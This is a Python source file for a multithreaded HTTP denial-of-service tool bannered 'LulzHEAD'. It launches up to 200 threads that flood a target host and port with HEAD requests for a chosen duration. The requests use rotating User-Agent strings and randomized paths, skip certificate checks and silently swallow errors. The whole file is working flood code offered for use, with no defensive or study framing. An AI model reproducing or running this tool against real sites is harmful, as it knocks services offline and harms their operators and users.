import threading, sys, os, time, requests, json
from random import choice, randint
from utils import *

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def flood():

    url = sys.argv[2]
    port = int(sys.argv[3])
    duration = int(sys.argv[4])

    time.sleep(5)

    stoptime = time.time() + duration
    session = createsession()
    while time.time() < stoptime:
        try:            
            session.head(f'{"http" if port == 80 else "https"}://{url}:{port}/{buildblock(url)}', headers={'User-Agent': choice(ualist)}, verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$   /$$ /$$$$$$$$  /$$$$$$  /$$$$$$$ 
            | $$                | $$          | $$  | $$| $$_____/ /$$__  $$| $$__  $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  | $$| $$      | $$  \ $$| $$  \ $$
            | $$      | $$  | $$| $$|____ /$$/| $$$$$$$$| $$$$$   | $$$$$$$$| $$  | $$
            | $$      | $$  | $$| $$   /$$$$/ | $$__  $$| $$__/   | $$__  $$| $$  | $$
            | $$      | $$  | $$| $$  /$$__/  | $$  | $$| $$      | $$  | $$| $$  | $$
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$/
            |________/ \______/ |__/|________/|__/  |__/|________/|__/  |__/|_______/ 
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')